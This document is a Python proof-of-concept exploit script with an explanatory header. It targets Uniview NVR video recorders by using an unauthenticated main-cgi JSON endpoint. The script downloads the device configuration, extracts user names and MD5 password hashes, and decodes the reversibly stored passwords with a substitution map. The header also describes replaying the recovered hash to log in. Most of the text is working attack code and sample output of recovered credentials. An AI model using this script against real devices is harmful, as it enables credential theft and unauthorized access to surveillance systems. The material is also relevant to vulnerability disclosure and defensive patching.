# Uniview NVR remote passwords disclosure
# Author: B1t

# The Uniview NVR web application does not enforce authorizations on the main.cgi file when requesting json data.
# It says that you can do anything without authentication, however you must know the request structure.
# In addition, the users' passwords are both hashed and also stored in a reversible way
# The POC below remotely downloads the device's configuration file, extracts the credentials
# and decodes the reversible password strings using my crafted map

# It is worth mention that when you login, the javascript hashes the password with MD5 and pass the request.
# If the script does retrieve the hash and not the password, you can intercept the request and replace the generated
# MD5 with the one disclosed using this script


# Tested on the following models:
#   NVR304-16E - Software Version B3118P26C00510
#   NVR301-08-P8 - Software Version B3218P26C00512
#                  and version B3220P11
#
# Other versions may also be affected


# Usage: python nvr-pwd-disc.py http://Host_or_IP:PORT

# Run example:
#
# root@k4li:~# python nvr-pwd-disc.py http://192.168.1.5
#
# Uniview NVR remote passwords disclosure!
# Author: B1t
#
# [+] Getting model name and software version...
# Model: NVR301-08-P8
# Software Version: B3218P26C00512
#
# [+] Getting configuration file...
# [+] Number of users found: 4
#
# [+] Extracting users' hashes and decoding reversible strings:
#
# User 	|	 Hash 	|	 Password
# _________________________________________________
# admin 	|	3b9c687b1f4b9d87ed0fdd6abbf7e33d 	|	<TRIMMED>
# default 	|	 	|	||||||||||||||||||||
# HAUser 	|	288b836a37578141fea6527b5e190120 	|	123HAUser123[err
# test 	|	51b2454c681f3205f63b8372096d990b 	|	AA123pqrstuvwxyz
#
#  *Note that the users 'default' and 'HAUser' are default and sometimes inaccessible remotely


import requests
import xml.etree.ElementTree
import sys


print "\r\nUniview NVR remote passwords disclosure!"
print "Author: B1t\r\n"


def decode_pass(rev_pass):
    pass_dict = {
        '77': '1', '78': '2', '79': '3', '72': '4', '73': '5', '74': '6', '75': '7', '68': '8', '69': '9',
        '76': '0', '93': '!', '60': '@', '95': '#', '88': '$', '89': '%', '34': '^', '90': '&', '86': '*',
        '84': '(', '85': ')', '81': '-', '35': '_', '65': '=', '87': '+', '83': '/', '32': '\\', '0': '|',
        '80': ',', '70': ':', '71': ';', '7': '{', '1': '}', '82': '.', '67': '?', '64': '<', '66': '>',
        '2': '~', '39': '[', '33': ']', '94': '"', '91': "'", '28': '`',
        '61': 'A', '62': 'B', '63': 'C', '56': 'D', '57': 'E', '58': 'F', '59': 'G',
        '52': 'H', '53': 'I', '54': 'J', '55': 'K', '48': 'L', '49': 'M', '50': 'N', '51': 'O',
        '44': 'P', '45': 'Q', '46': 'R', '47': 'S', '40': 'T', '41': 'U', '42': 'V', '43': 'W',
        '36': 'X', '37': 'Y', '38': 'Z',
        '29': 'a', '30': 'b', '31': 'c', '24': 'd', '25': 'e', '26': 'f', '27': 'g',
        '20': 'h', '21': 'i', '22': 'j', '23': 'k', '16': 'l', '17': 'm', '18': 'n', '19': 'o',
        '12': 'p', '13': 'q', '14': 'r', '15': 's', '8': 't', '9': 'u', '10': 'v', '11': 'w',
        '4': 'x', '5': 'y', '6': 'z',
    }
    rev_pass = rev_pass.split(";")
    pass_len = len(rev_pass) - rev_pass.count("124")
    password = ""
    for char in rev_pass:
        if char != "124":
            password = password + pass_dict[char]
    return pass_len, password


if len(sys.argv) < 2:
    print "Usage: " + sys.argv[0] + " http://HOST_or_IP:PORT\r\n PORT: The web interface's port"
    print "\r\nExample: " + sys.argv[0] + " http://192.168.1.1:8850"
    sys.exit()
elif "http://" not in sys.argv[1] and "https://" not in sys.argv[1]:
    print "Usage: " + sys.argv[0] + " http://HOST_or_IP:PORT\r\n PORT: The web interface's port"
    sys.exit()

host = sys.argv[1]

print "[+] Getting model name and software version..."
r = requests.get(host + '/cgi-bin/main-cgi?json={"cmd": 116}')
if r.status_code != 200:
    print "Failed fetching version, got status code: " + str(r.status_code)

print "Model: " + r.text.split('szDevName":\t"')[1].split('",')[0]
print "Software Version: " + r.text.split('szSoftwareVersion":\t"')[1].split('",')[0]

print "\r\n[+] Getting configuration file..."
r = requests.get(host + '/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":8888888888}')
if r.status_code != 200:
    print "Failed fetching configuration file, response code: " + str(r.status_code)
    sys.exit()
root = xml.etree.ElementTree.fromstring(r.text)

print "[+] Number of users found: " + root.find("UserCfg").get("Num")
print "\r\n[+] Extracting users' hashes and decoding reversible strings:"
users = root.find("UserCfg").getchildren()

print "\r\nUser \t|\t Hash \t|\t Password"
print "_________________________________________________"
for user in users:
    l, p = decode_pass(user.get("RvsblePass"))
    print user.get("UserName"), "\t|\t", user.get("UserPass"), "\t|\t", p

print "\r\n *Note that the users 'default' and 'HAUser' are default and sometimes inaccessible remotely"
